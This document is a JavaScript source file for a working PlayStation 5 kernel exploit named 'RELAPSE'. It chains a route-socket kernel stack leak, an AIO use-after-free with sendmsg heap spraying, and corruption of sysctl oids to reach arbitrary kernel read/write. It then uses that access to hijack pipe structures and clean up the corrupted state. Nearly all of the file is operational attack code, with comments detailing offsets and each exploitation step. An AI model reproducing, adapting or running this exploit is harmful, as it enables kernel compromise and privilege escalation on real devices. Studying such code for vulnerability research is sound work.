//#region Contants
const RTM_GET = 4;
const RTA_DST = 1;
const RTM_VERSION = 5;
const RTA_AUTHOR = 0x40;
const DST_LEN = 0x58;
const AUTHOR_LEN = 0xff;

const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
const NUM_WORKER = 2;

const AIO_OP_CANCEL = 1;
const AIO_OP_WAIT = 2;
const AIO_OP_POLL = 4;
const AIO_OP_DELETE = 8;

const AIO_MAX_NUM = 0x80;
const AIO_WAIT_DEFAULT = 0;
const AIO_WAIT_AND = 1;
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;

const uaf_ids = new Array(0);
const block_ss = new Array(2);
const block_ids = new Uint32Array(NUM_WORKER);
const outs = new Uint32Array(AIO_MAX_NUM);

let wait_mode = undefined;
const timeout = new Uint32Array(1);

let msg = undefined;
let reqs1 = undefined;
let cpus_mib = undefined; // krw master lo
let maxcpus_mib = undefined; // krw victim
let topology_mib = undefined; // krw master hi

fn.sendmsg = new NativeFunction(0x1c, 'bint');
fn.aio_multi_delete = new NativeFunction(0x296, 'number');
fn.aio_multi_wait = new NativeFunction(0x297, 'number');
fn.aio_multi_poll = new NativeFunction(0x298, 'number');
fn.aio_multi_cancel = new NativeFunction(0x29a, 'number');
fn.aio_submit_cmd = new NativeFunction(0x29d, 'number');
//#endregion
//#region Functions
function build_reqs1(count, fd = -1) {
  mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  for (let i = 0; i < count; i++) {
    reqs1[i].nbyte = fd === -1 ? 0 : 1;
    reqs1[i].fd = fd;
  }
}

function spray_aio(cmd, num_reqs, ids, count = ids.length) {
  const step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
  count = cmd & AIO_CMD_MULTI ? count / step : count;

  const ids_addr = ids.buffer.data();
  const total = count * step;

  for (let i = 0; i < total; i += step) {
    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);

    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
  }
}

function process_aio(op, ids, offset = 0, count = ids.length - offset) {
  const ids_addr = ids.buffer.data();
  const outs_addr = outs.buffer.data();

  while (count > 0) {
    const step = Math.min(count, AIO_MAX_NUM);

    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);

    if (op & AIO_OP_CANCEL) {
      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_WAIT) {
      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, wait_mode, timeout.buffer.data());
    }

    if (op & AIO_OP_POLL) {
      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_DELETE) {
      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
    }

    count -= step;
    offset += step;
  }
}

function sysctl_read(mib) {
  const out = new Uint32Array(1);
  const len = new Uint32Array([out.byteLength]);

  if (fn.sysctl.invoke(mib.buffer.data(), mib.length, out.buffer.data(), len.buffer.data(), 0, 0) === -1) {
    throw new SyscallError('Unable to sysctl !!');
  }

  if (len[0] !== out.byteLength) {
    throw new Error(`sysctl read mismatch, expected ${out.byteLength} got ${len[0]} !!`);
  }

  return out[0];
}

function sysctl_write(mib, value) {
  const input = new Uint32Array([value]);

  if (fn.sysctl.invoke(mib.buffer.data(), mib.length, 0, 0, input.buffer.data(), input.byteLength) === -1) {
    throw new SyscallError('Unable to sysctl write !!');
  }
}

// restricted to kernel .data due to having control over lower 32bit part of victim oid_arg1
function kread32(lo) {
  if (lo === 0) {
    throw new Error('Empty addr !!');
  }

  sysctl_write(cpus_mib, lo);
  return sysctl_read(maxcpus_mib);
}

// restricted to kernel .data due to having control over lower 32bit part of victim oid_arg1
function kwrite32(lo, value) {
  if (lo === 0) {
    throw new Error('Empty addr !!');
  }

  sysctl_write(cpus_mib, lo);
  sysctl_write(maxcpus_mib, value);
}

// uses 2 masters to control upper and lower part of victim oid_arg1 and achieve arbitrary read
function kread64(addr) {
  if (addr.eq(0)) {
    throw new Error('Empty addr !!');
  }

  sysctl_write(topology_mib, addr.hi);

  sysctl_write(cpus_mib, addr.lo);
  const lo = sysctl_read(maxcpus_mib);

  sysctl_write(cpus_mib, addr.lo + 4);
  const hi = sysctl_read(maxcpus_mib);

  return new BInt(hi, lo);
}

// uses 2 masters to control upper and lower part of victim oid_arg1 and achieve arbitrary write
function kwrite64(addr, value) {
  if (addr.eq(0)) {
    throw new Error('Empty addr !!');
  }

  sysctl_write(topology_mib, addr.hi);

  sysctl_write(cpus_mib, addr.lo);
  sysctl_write(maxcpus_mib, value.lo);

  sysctl_write(cpus_mib, addr.lo + 4);
  sysctl_write(maxcpus_mib, value.hi);
}

/*
  initiate a new aio read request and wait using AIO_WAIT_DEFAULT wait mode, this causes an AIO MWait mutex to be allocated and used across all entries's aio_batch that are to be waited
  along with it, we provide a timeout to trigger the UAF on the aio_waiter by having aio_multi_wait time out and freeing AIO MWait mutex on exit while pending aio request still references it
  from there we can spray an arbitrary kernel address at +0 and a valid mtx at +0x10 then aio_multi_cancel a request to trigger arbitrary decrement
*/
function aio_uaf_arb_dec(targets) {
  if (targets.length === 0) {
    throw new Error('Empty targets !!');
  }

  logger.info('Triggering UAF arbitrary decrement on targets started...');

  // the + 2 includes the first entry to keep aio multi requests alive
  // for cleanup later and last entry as it has no aio_waiter
  // and thus can't be used to trigger arbitrary decrement
  const num_reqs = targets.length + 2;
  const reqs_ids = new Uint32Array(num_reqs);
  const status = outs.subarray(0, num_reqs);

  const waiter_size = num_reqs * 0x38; // sizeof(aio_waiter)
  const iov_size = waiter_size.alignUp(iovec.sizeof);

  const msg_iov = iovec.new(mem.alloc(iov_size));

  msg.msg_iov = msg_iov.addr;
  msg.msg_iovlen = iov_size / iovec.sizeof;

  try {
    build_reqs1(num_reqs);

    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, num_reqs, reqs_ids);
    logger.debug(`reqs_ids: ${Array.from(reqs_ids).map((x) => x.hex())}`);

    process_aio(AIO_OP_POLL, reqs_ids);
    logger.debug(`status: ${status.hex()}`);

    process_aio(AIO_OP_WAIT, reqs_ids);

    // excludes first and last entry
    let offset = 1;
    for (const target of targets) {
      // craft aio_waiter and spray UAF using sendmsg
      msg_iov[0].iov_base = target;
      msg_iov[1].iov_base = kernel_base.add(impl.k_ntpadj_lock); // mtx

      for (let i = 0; i < 0x100; i++) {
        fn.sendmsg.invoke(0, msg.addr, 0);
      }

      process_aio(AIO_OP_CANCEL, reqs_ids, offset++, 1);

      process_aio(AIO_OP_POLL, reqs_ids);
      logger.debug(`status: ${status.hex()}`);

      logger.info(`Achieved decrement on target ${target} !!`);
    }

    uaf_ids.push(...reqs_ids); // cleanup uaf aio_waiter later
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
  } finally {
    mem.free(msg_iov.addr);
    mem.bset(msg.addr, msghdr.sizeof, 0);
  }

  logger.info('Triggered UAF arbitrary decrement on targets !!');
}

function init() {
  logger.info('Environment init started...');

  pin_to_core(MAIN_CORE);
  set_rtprio(RTP);

  // Prepare reqs
  const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);

  msg = msghdr.new();

  make_karw_pipe();

  [block_ss[0], block_ss[1]] = make_socketpair(AF_UNIX, SOCK_STREAM);

  logger.debug(`block_ss: ${block_ss}`);

  timeout[0] = 1;
  wait_mode = AIO_WAIT_DEFAULT;

  cpus_mib = name2oid('kern.smp.cpus');
  maxcpus_mib = name2oid('kern.smp.maxcpus');
  topology_mib = name2oid('kern.smp.topology');

  logger.debug(`cpus_mib: ${cpus_mib.hex()}`);
  logger.debug(`maxcpus_mib: ${maxcpus_mib.hex()}`);
  logger.debug(`topology_mib: ${topology_mib.hex()}`);

  logger.info('Environment init completed !!');
}

function cleanup() {
  logger.info('Environment cleanup started...');

  for (const fd of block_ss) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  if (block_ids.some((v) => v !== 0)) {
    timeout[0] = 0;
    wait_mode = AIO_WAIT_AND;
    process_aio(AIO_OP_WAIT | AIO_OP_DELETE, block_ids);
  }

  if (uaf_ids.some((v) => v !== 0)) {
    const ids = new Uint32Array(uaf_ids);
    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, ids);
    uaf_ids.fill(0);
  }

  free_karw_pipe();

  if (reqs1 !== undefined) {
    mem.free(reqs1.addr);
  }

  if (msg !== undefined) {
    mem.free(msg.addr);
  }

  logger.info('Environment cleanup completed !!');
}

function setup() {
  logger.info('Environment setup started...');

  logger.info('Block AIO workers...');

  build_reqs1(NUM_WORKER, block_ss[0]);

  spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_WORKER, block_ids);
  logger.debug(`block_ids: ${block_ids.hex()}`);

  const status = outs.subarray(0, NUM_WORKER);

  process_aio(AIO_OP_POLL, block_ids);
  logger.debug(`status: ${status}`);

  logger.info('Environment setup completed !!');
}

// use an AF_ROUTE socket to leak kernel stack by bug in route_output that copyout sin_len without validation against sizeof(sockaddr_storage)
function leak_kaddrs() {
  logger.info('Leak kernel stack started...');

  const leak_fd = make_socket(AF_ROUTE, SOCK_RAW);
  logger.debug(`leak_fd: ${leak_fd}`);

  const msg = rtmsg.new();

  msg.rtm.rtm_msglen = rt_msghdr.sizeof;
  msg.rtm.rtm_version = RTM_VERSION;
  msg.rtm.rtm_type = RTM_GET;
  msg.rtm.rtm_addrs = RTA_DST | RTA_AUTHOR;
  msg.rtm.rtm_seq = 0x1234;

  const dst_addr = sockaddr_in.new(msg.addr.add(msg.rtm.rtm_msglen));
  dst_addr.sin_len = DST_LEN;
  dst_addr.sin_family = AF_INET;
  dst_addr.sin_addr = 0x0100007f; // 127.0.0.1

  msg.rtm.rtm_msglen += DST_LEN;

  const author_addr = sockaddr_in.new(msg.addr.add(msg.rtm.rtm_msglen));
  author_addr.sin_len = AUTHOR_LEN;
  author_addr.sin_family = AF_INET6;

  msg.rtm.rtm_msglen += AUTHOR_LEN;

  const omsglen = msg.rtm.rtm_msglen;

  if (fn.write.invoke(leak_fd, msg.addr, msg.rtm.rtm_msglen).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${leak_fd} !!`);
  }

  if (fn.read.invoke(leak_fd, msg.addr, msg.rtm.rtm_msglen).eq(-1)) {
    throw new SyscallError(`Unable to read from fd ${leak_fd} !!`);
  }

  if (fn.close.invoke(leak_fd) === -1) {
    throw new SyscallError(`Unable to close fd ${fd} !!`);
  }

  if (msg.rtm.rtm_msglen === omsglen) {
    mem.free(msg.addr);
    throw new Error('Unable to leak kernel stack !!');
  }

  const offset = msg.rtm.rtm_msglen - rt_msghdr.sizeof - DST_LEN;
  const size = msg.rtm.rtm_msglen - offset;

  const stack = new ArrayBuffer(size);
  const view = new DataView(stack);

  mem.copy(stack.data(), msg.addr.add(offset), size);
  mem.free(msg.addr);

  logger.info('Leaked kernel stack !!');

  const rtmsg2_ret = view.getBInt(0xa8, true);
  logger.debug(`rtmsg2_ret: ${rtmsg2_ret}`);

  kernel_base = rtmsg2_ret.sub(impl.k_route_output_rtmsg2_ret);
  logger.info(`kernel base: ${kernel_base}`);

  allproc = kernel_base.add(impl.k_allproc);
  logger.debug(`allproc: ${allproc}`);
}

/*
We use leaked kernel base/addresses and arbitrary decrement to corrupt static sysctl oids that has sysctl_handle_int and oid_arg1
by corrupting oid_kind BYTE3 so that it has CTLFLAG_WR and CTLFLAG_ANYBODY which allows sysctl write and oid_enabled to allow it
to be used in userland, this is so that master oid can control oid_arg1 of victim oid and achieve kernel read/write by using sysctl 
syscall as shown below: 

int
sysctl_handle_int(SYSCTL_HANDLER_ARGS)
{
	int tmpout, error = 0;

	if (arg1)
		tmpout = *(int *)arg1;
	else
		tmpout = arg2;
	error = SYSCTL_OUT(req, &tmpout, sizeof(int));

	if (error || !req->newptr)
		return (error);

	if (!arg1)
		error = EPERM;
	else
		error = SYSCTL_IN(req, arg1, sizeof(int));
	return (error);
}

this will only allow for restricted kernel read/write into kernel .data since single master can only control lower 4 bytes of oid_arg1
then we can use existing master/victim to corrupt another sysctl oid as 2nd master that controlles upper part of oid_arg1 which allows
us to achieve arbitrary kernel read/write

ps5 struct:

struct sysctl_oid {                           // sizeof(sysctl_oid) == 0x60
	struct sysctl_oid_list oid_children;        // 0x00
	struct sysctl_oid_list *oid_parent;         // 0x08
	SLIST_ENTRY(sysctl_oid) oid_link;           // 0x10
	int		 oid_number;                          // 0x18
	u_int		 oid_kind;                          // 0x1C
	void		*oid_arg1;                          // 0x20
	intmax_t	 oid_arg2;                        // 0x28
	const char	*oid_name;                      // 0x30
	int		(*oid_handler)(SYSCTL_HANDLER_ARGS);  // 0x38
	const char	*oid_fmt;                       // 0x40
	int		 oid_refcnt;                          // 0x48
	u_int		 oid_running;                       // 0x4C
	const char	*oid_descr;                     // 0x50
  int		 oid_enabled; (guessed)               // 0x58
	int		 oid_called; (guessed)                // 0x5C
};
*/
function make_karw() {
  logger.info('Initiate restricted kernel RW started...');

  const sysctl___kern_smp_cpus = kernel_base.add(impl.k_sysctl___kern_smp_cpus);
  logger.debug(`sysctl___kern_smp_cpus: ${sysctl___kern_smp_cpus}`);

  const sysctl___kern_smp_maxcpus = sysctl___kern_smp_cpus.sub(0x128);
  logger.debug(`sysctl___kern_smp_maxcpus: ${sysctl___kern_smp_maxcpus}`);

  const sysctl___kern_smp_topology = sysctl___kern_smp_cpus.add(0x60);
  logger.debug(`sysctl___kern_smp_topology: ${sysctl___kern_smp_topology}`);

  const targets = [
    sysctl___kern_smp_cpus.add(0x21), // decrement oid_arg1 by 0x100 (BYTE1 - 1) to make it point to maxcpus oid_arg1 and becomes krw master/victim
    sysctl___kern_smp_cpus.add(0x1f), // decrement oid_kind BYTE3 by 1 for 0x80 becomes 0x7f which has CTLFLAG_WR and CTLFLAG_ANYBODY to allow sysctl write
    sysctl___kern_smp_maxcpus.add(0x58), // decrement oid_enabled by 1 to allow sysctl to userland
    sysctl___kern_smp_maxcpus.add(0x1f), // decrement oid_kind BYTE3 by 1, 0x80 becomes 0x7f which has CTLFLAG_WR and CTLFLAG_ANYBODY to allow sysctl write
  ];

  aio_uaf_arb_dec(targets);

  const maxcpus_oid_arg1_lo = sysctl_read(cpus_mib); // used later to restore original state after karw
  logger.debug(`maxcpus_oid_arg1_lo: ${maxcpus_oid_arg1_lo.hex()}`);

  if (maxcpus_oid_arg1_lo <= 0x10) {
    throw new Error('Unable to setup krw master lo');
  }

  const topology_oid_arg1_lo = kread32(sysctl___kern_smp_topology.add(0x20).lo); // used later to restore original state after karw
  logger.debug(`topology_oid_arg1_lo: ${topology_oid_arg1_lo.hex()}`);

  if (topology_oid_arg1_lo <= 0x10) {
    throw new Error('Unable to setup krw master hi');
  }

  logger.info('Achieved restricted kernel RW !!');

  logger.info('Initiate unrestricted kernel RW started...');

  // use corrupted oid master/victim to corrupt 2nd master that controls upper 32bit of oid_arg1 for kernel arbitrary read/write
  const old_topology_oid_kind = kread32(sysctl___kern_smp_topology.add(0x1c).lo);
  logger.debug(`old_topology_oid_kind: ${old_topology_oid_kind.hex()}`);

  const new_topology_oid_kind = ((old_topology_oid_kind & 0xffffff) | (0x7f << 24)) >>> 0; // has CTLFLAG_WR | CTLFLAG_ANYBODY to allow sysctl write
  logger.debug(`new_topology_oid_kind: ${new_topology_oid_kind.hex()}`);

  kwrite32(sysctl___kern_smp_topology.add(0x1c).lo, new_topology_oid_kind);
  kwrite32(sysctl___kern_smp_topology.add(0x58).lo, 1);
  kwrite32(sysctl___kern_smp_topology.add(0x20).lo, sysctl___kern_smp_maxcpus.add(0x24).lo);

  logger.info('Achieved unrestricted kernel RW !!');

  logger.info('Initiate kernel ARW...');

  const pid = fn.getpid.invoke();
  logger.debug(`pid: ${pid}`);

  let p = kread64(allproc);
  while (p.neq(0)) {
    const p_pid = kread64(p.add(k_proc_pid));
    if (p_pid.lo === pid) break;

    p = kread64(p); // p_list.le_next
  }

  const p_fd = kread64(p.add(0x48));
  logger.debug(`p_fd: ${p_fd}`);

  fdt_ofiles = kread64(p_fd).add(k_filedesc_fdt_ofiles);
  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);

  const master_pipe_fp = kread64(fdt_ofiles.add(master_pipe[0] * k_filedesc_sizeof));
  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);

  const victim_pipe_fp = kread64(fdt_ofiles.add(victim_pipe[0] * k_filedesc_sizeof));
  logger.debug(`victim_pipe_fp: ${victim_pipe_fp}`);

  const master_pipe_f_data = kread64(master_pipe_fp);
  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);

  const victim_pipe_f_data = kread64(victim_pipe_fp);
  logger.debug(`victim_pipe_f_data: ${victim_pipe_f_data}`);

  kwrite64(master_pipe_f_data.add(0x10), victim_pipe_f_data);

  kv = new KernelView(master_pipe, victim_pipe);

  inc_karw_pipe_refcnt();

  logger.info('Achieved kernel ARW !!');

  // restore original state of corrupted oids using karw

  kview(sysctl___kern_smp_cpus).setUint8(0x1f, 0x80, true); // CTLFLAG_RD
  kview(sysctl___kern_smp_cpus).setBInt(0x20, sysctl___kern_smp_cpus.sub(8), true);
  kview(sysctl___kern_smp_cpus).setUint32(0x5c, 0, true);

  kview(sysctl___kern_smp_maxcpus).setUint8(0x1f, 0x80, true); // CTLFLAG_RD
  kview(sysctl___kern_smp_maxcpus).setUint32(0x20, maxcpus_oid_arg1_lo, true);
  kview(sysctl___kern_smp_maxcpus).setInt32(0x24, -1, true);
  kview(sysctl___kern_smp_maxcpus).setUint32(0x58, 0, true);
  kview(sysctl___kern_smp_maxcpus).setUint32(0x5c, 0, true);

  kview(sysctl___kern_smp_topology).setUint8(0x1f, 0x80, true); // CTLFLAG_RD
  kview(sysctl___kern_smp_topology).setUint32(0x20, topology_oid_arg1_lo, true);
  kview(sysctl___kern_smp_topology).setInt32(0x24, -1, true);
  kview(sysctl___kern_smp_topology).setUint32(0x58, 0, true);
  kview(sysctl___kern_smp_topology).setUint32(0x5c, 0, true);
}

/* 
used to cleanup UAF aio_waiter from aio requests aio_batch so that remaining reqs
can be cancelled safely and for aio_multi_delete to allow deletion as it will not 
delete if aio_batch still has an aio_waiter as shown below:

if (*(aio_batch + 0x50) != 0) // aio_waiter
{
  printf("%s:%d err=%d\n", "_aio_multi_delete", __LINE__, __COLUMN__);
  outs[req_index] = 0x80020010;
}
*/
function remove_uaf_waiter_from_aio(ids) {
  find_all_proc();

  const p = pfind(fn.getpid.invoke());
  const aio_table = kview(p).getBInt(impl.k_aio_table, true);

  const get_aio_entry = function (id) {
    const bucket_offset = Math.floor((id % 0x2000) / 0x80) * 8;
    const entry_offset = (id % 0x80) * 0x30;

    const bucket = kview(aio_table).getBInt(bucket_offset, true);
    return kview(bucket).getBInt(entry_offset + 0x10, true);
  };

  const multi = ids.every((id) => id % 0x2000 === ids[0] % 0x2000);
  if (multi) {
    const aio_entry = get_aio_entry(ids[0]);
    const reqs_num = kview(aio_entry).getUint16(0, true);
    const aio_spinfo = kview(aio_entry).getBInt(0x28, true);

    if (reqs_num !== ids.length) {
      throw new Error('AIO reqs count mismatch !!');
    }

    for (let i = 0; i < reqs_num; i++) {
      const aio_request = kview(aio_spinfo).getBInt(i * 8, true);
      const aio_batch = kview(aio_request).getBInt(0x20, true);
      kview(aio_batch).setBInt(0x50, 0, true); // aio_waiter
    }
  } else {
    for (const id of ids) {
      const aio_entry = get_aio_entry(id);
      const aio_batch = kview(aio_entry).getBInt(0x10, true);
      kview(aio_batch).setBInt(0x50, 0, true); // aio_waiter
    }
  }
}

async function exploit_main() {
  logger.info('===RELAPSE===');

  try {
    init();
    setup();
    leak_kaddrs();
    make_karw();

    logger.info('Corrupted context cleanup started...');

    remove_uaf_waiter_from_aio(uaf_ids);

    logger.info('Corrupted context cleanup completed !!');
  } finally {
    try {
      cleanup();
    } catch (cleanup_err) {
      logger.error(`Unable to cleanup: ${cleanup_err}`);
    }
  }

  logger.info('===END===');
}
//#endregion
//#region Structs
const iovec = new Struct('iovec', [
  { type: 'Uint64', name: 'iov_base' },
  { type: 'Uint64', name: 'iov_len' },
]);

const msghdr = new Struct('msghdr', [
  { type: 'Uint64', name: 'msg_name' },
  { type: 'Uint32', name: 'msg_namelen' },
  { type: 'iovec*', name: 'msg_iov' },
  { type: 'Int32', name: 'msg_iovlen' },
  { type: 'Uint64', name: 'msg_control' },
  { type: 'Uint32', name: 'msg_controllen' },
  { type: 'Int32', name: 'msg_flags' },
]);

const rt_metrics = new Struct('rt_metrics', [
  { type: 'Uint64', name: 'rmx_locks' },
  { type: 'Uint64', name: 'rmx_mtu' },
  { type: 'Uint64', name: 'rmx_hopcount' },
  { type: 'Uint64', name: 'rmx_expire' },
  { type: 'Uint64', name: 'rmx_recvpipe' },
  { type: 'Uint64', name: 'rmx_sendpipe' },
  { type: 'Uint64', name: 'rmx_ssthresh' },
  { type: 'Uint64', name: 'rmx_rtt' },
  { type: 'Uint64', name: 'rmx_rttvar' },
  { type: 'Uint64', name: 'rmx_pksent' },
  { type: 'Uint64', name: 'rmx_weight' },
  { type: 'Uint64', name: 'rmx_filler', count: 3 },
]);

const rt_msghdr = new Struct('rt_msghdr', [
  { type: 'Uint16', name: 'rtm_msglen' },
  { type: 'Uint8', name: 'rtm_version' },
  { type: 'Uint8', name: 'rtm_type' },
  { type: 'Uint16', name: 'rtm_index' },
  { type: 'Int32', name: 'rtm_flags' },
  { type: 'Int32', name: 'rtm_addrs' },
  { type: 'Int32', name: 'rtm_pid' },
  { type: 'Int32', name: 'rtm_seq' },
  { type: 'Int32', name: 'rtm_errno' },
  { type: 'Int32', name: 'rtm_fmask' },
  { type: 'Uint64', name: 'rtm_inits' },
  { type: 'rt_metrics', name: 'rtm_rmx' },
]);

const rtmsg = new Struct('rtmsg', [
  { type: 'rt_msghdr', name: 'rtm' },
  { type: 'Uint8', name: 'space', count: 512 },
]);

const SceKernelAioResult = new Struct('SceKernelAioResult', [
  { type: 'Int64', name: 'return_value' },
  { type: 'Int32', name: 'state' },
  { type: 'Uint32', name: '_pad' },
]);

const SceKernelAioRWRequest = new Struct('SceKernelAioRWRequest', [
  { type: 'Uint64', name: 'offset' },
  { type: 'Uint64', name: 'nbyte' },
  { type: 'Uint64', name: 'buf' },
  { type: 'SceKernelAioResult*', name: 'result' },
  { type: 'Int32', name: 'fd' },
]);
//#endregion
